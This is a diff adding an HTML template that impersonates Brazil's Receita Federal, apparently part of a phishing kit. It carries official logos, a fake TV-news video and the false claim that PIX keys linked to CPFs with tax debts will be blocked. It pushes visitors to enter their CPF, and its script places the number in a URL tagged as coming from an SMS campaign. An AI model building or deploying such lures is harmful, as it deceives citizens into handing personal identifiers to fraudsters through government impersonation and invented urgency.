@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+<html data-template="verificar-cpf">
+<head>
+    <meta charset="utf-8"/>
+    <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
+    <title>Receita Federal - Verificar CPF</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        @font-face {
+            font-family: 'Rawline';
+            src: url("{{ url_for('static', filename='fonts/rawline-400.ea42a37247439622.woff2') }}") format('woff2');
+            font-weight: 400;
+            font-style: normal;
+        }
+        @font-face {
+            font-family: 'Rawline';
+            src: url("{{ url_for('static', filename='fonts/rawline-600.844a17f0db94d147.woff2') }}") format('woff2');
+            font-weight: 600;
+            font-style: normal;
+        }
+        @font-face {
+            font-family: 'Rawline';
+            src: url("{{ url_for('static', filename='fonts/rawline-700.1c7c76152b40409f.woff2') }}") format('woff2');
+            font-weight: 700;
+            font-style: normal;
+        }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Rawline', sans-serif;
+        }
+        body {
+            background-color: white;
+            padding-top: 60px;
+            color: #333333;
+            font-size: 16px;
+            line-height: 1.05;
+        }
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 8px 20px;
+            background-color: white;
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 1000;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            height: 60px;
+        }
+        .logo {
+            width: 240px;
+            height: auto;
+        }
+        .header-icons {
+            display: flex;
+            gap: 15px;
+        }
+        .header-icon {
+            font-size: 18px;
+            color: #0056b3;
+        }
+        .hero-image {
+            width: 100%;
+            height: auto;
+            overflow: hidden;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+        }
+        .hero-image img {
+            width: 100%;
+            height: auto;
+            object-fit: cover;
+        }
+        .user-info {
+            display: flex;
+            flex-direction: column;
+            position: relative;
+            margin: 15px;
+            box-shadow: 0 1px 6px rgba(0, 0, 0, 0.2);
+            background-color: white;
+            padding: 15px;
+            border-radius: 4px;
+            width: calc(100% - 30px);
+        }
+        .user-info-content {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+            width: 100%;
+        }
+        .user-info p {
+            margin: 1px 0;
+            color: #333333;
+            font-size: 16px;
+        }
+        .user-info p strong {
+            font-weight: 600;
+        }
+        .user-info h3 {
+            font-weight: 700;
+            color: #0c326f;
+            margin-bottom: 4px;
+        }
+        .video-container {
+            position: relative;
+            width: 100%;
+            margin: 8px auto 0;
+            border-radius: 4px;
+            overflow: hidden;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+        .news-video {
+            width: 100%;
+            display: block;
+        }
+        .sound-button {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background-color: rgba(220, 53, 69, 0.9);
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 8px;
+            cursor: pointer;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 8px;
+            animation: pulse 1s infinite ease-in-out;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.2);
+        }
+        .news-description {
+            color: #333;
+            margin-top: 12px;
+            padding: 0 4px;
+            text-align: justify;
+            width: 100%;
+        }
+        .verify-cpf-button {
+            width: 100%;
+            padding: 12px;
+            background-color: #0c326f;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-weight: 600;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            margin-top: 20px;
+        }
+        .verify-cpf-button:hover {
+            background-color: #092555;
+        }
+        .footer {
+            background-color: #01205B;
+            color: white;
+            padding: 16px;
+            text-align: center;
+            margin-top: 40px;
+            width: 100%;
+            position: relative;
+            bottom: 0;
+        }
+        .footer-logo {
+            width: 100px;
+            margin: 0 auto 8px;
+            display: block;
+        }
+        @keyframes pulse {
+            0% { transform: translate(-50%, -50%) scale(1); }
+            50% { transform: translate(-50%, -50%) scale(1.1); }
+            100% { transform: translate(-50%, -50%) scale(1); }
+        }
+        @media (max-width: 600px) {
+            .header {
+                padding: 6px 8px;
+            }
+            .logo {
+                width: 160px;
+            }
+            .header-icons {
+                gap: 8px;
+            }
+            .header-icon {
+                font-size: 16px;
+            }
+            .user-info {
+                margin: 10px;
+                width: calc(100% - 20px);
+            }
+        }
+    </style>
+</head>
+<body class="verificar-cpf-page">
+    <div class="header">
+        <img alt="Logo da Receita Federal" class="logo" src="https://servicos.receitafederal.gov.br/assets/images/receitaAzul.svg"/>
+        <div class="header-icons">
+            <i class="fas fa-search header-icon"></i>
+            <i class="fas fa-question-circle header-icon"></i>
+            <i class="fas fa-adjust header-icon"></i>
+        </div>
+    </div>
+
+    <div class="hero-image">
+        <img alt="Aviso sobre novas regras do PIX" src="https://i.ibb.co/N24MHrBp/Aviso-funcionamento-de-loja-simples-verde-vermelho-story-do-instagram-1080-x-400-px-2.png">
+    </div>
+
+    <div class="user-info">
+        <div class="user-info-content">
+            <div class="user-info-text">
+                <h3>Notícia na mídia</h3>
+                <p><strong>Programa:</strong> Jornal da Band</p>
+                <p><strong>Data:</strong> 05 de março de 2025</p>
+            </div>
+        </div>
+        <div class="video-container" data-debug="video-container">
+            <video id="newsVideo" class="news-video" autoplay muted playsinline webkit-playsinline data-debug="news-video">
+                <source src="{{ url_for('static', filename='videos/news.mp4') }}" type="video/mp4">
+                Seu navegador não suporta o elemento de vídeo.
+            </video>
+            <button id="soundButton" class="sound-button" data-debug="sound-button">
+                <i class="fas fa-volume-up"></i>
+                <span>CLIQUE PARA OUVIR!</span>
+            </button>
+        </div>
+        <p class="news-description">
+            De acordo com as novas diretrizes do Banco Central, todas as chaves PIX vinculadas a CPFs com pendências tributárias poderão ser bloqueadas para transferências. Esta medida visa garantir a conformidade fiscal e a segurança do sistema financeiro nacional. Para regularizar sua situação e evitar o bloqueio de suas chaves PIX, insira seu CPF abaixo e verifique se há pendências em seu cadastro.
+        </p>
+        <button onclick="window.location.href='/buscar-cpf'" class="verify-cpf-button">
+            Verificar meu CPF
+        </button>
+    </div>
+
+    <footer class="footer">
+        <img src="https://www.enat.receita.economia.gov.br/pt-br/area_nacional/noticias/logo-rfb/image_preview" alt="Receita Federal Logo" class="footer-logo">
+        <p>© 2025 Receita Federal do Brasil. Todos os direitos reservados.</p>
+    </footer>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            console.log('[DEBUG] Inicializando script de vídeo');
+
+            const video = document.getElementById('newsVideo');
+            const soundButton = document.getElementById('soundButton');
+
+            if (!video || !soundButton) {
+                console.error('[DEBUG] Elementos de vídeo ou botão não encontrados');
+                return;
+            }
+
+            console.log('[DEBUG] Elementos encontrados, configurando eventos');
+
+            // Garantir que o vídeo começa mudo e o botão de som visível
+            video.muted = true;
+            soundButton.style.display = 'flex';
+
+            // Ao clicar no vídeo
+            video.addEventListener('click', function(e) {
+                console.log('[DEBUG] Clique no vídeo');
+                e.preventDefault(); // Prevenir comportamento padrão
+
+                if (video.paused) {
+                    console.log('[DEBUG] Iniciando reprodução');
+                    video.play();
+                } else {
+                    console.log('[DEBUG] Pausando reprodução');
+                    video.pause();
+                }
+                soundButton.style.display = 'flex';
+            });
+
+            // Ao clicar no botão de som
+            soundButton.addEventListener('click', function(e) {
+                console.log('[DEBUG] Clique no botão de som');
+                e.preventDefault();
+                video.currentTime = 0;
+                video.muted = false;
+                video.play();
+                soundButton.style.display = 'none';
+            });
+
+            // Quando o vídeo terminar
+            video.addEventListener('ended', function() {
+                console.log('[DEBUG] Vídeo terminou');
+                video.currentTime = 0;
+                video.pause();
+                video.muted = true;
+                soundButton.style.display = 'flex';
+            });
+
+            // Garantir que o vídeo começa do início
+            video.currentTime = 0;
+            console.log('[DEBUG] Inicialização completa');
+        });
+        document.getElementById('cpfInput').addEventListener('input', function(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length > 11) value = value.slice(0, 11);
+
+            if (value.length > 9) {
+                value = value.replace(/^(\d{3})(\d{3})(\d{3})(\d{2}).*/, '$1.$2.$3-$4');
+            } else if (value.length > 6) {
+                value = value.replace(/^(\d{3})(\d{3})(\d{3}).*/, '$1.$2.$3');
+            } else if (value.length > 3) {
+                value = value.replace(/^(\d{3})(\d{3}).*/, '$1.$2');
+            }
+
+            e.target.value = value;
+        });
+
+        document.getElementById('verifyButton').addEventListener('click', function() {
+            const cpf = document.getElementById('cpfInput').value.replace(/\D/g, '');
+            if (cpf.length === 11) {
+                window.location.href = `/?utm_source=smsempresa&utm_medium=sms&utm_content=${cpf}`;
+            } else {
+                alert('Por favor, digite um CPF válido');
+            }
+        });
+    </script>
+</body>
+</html>
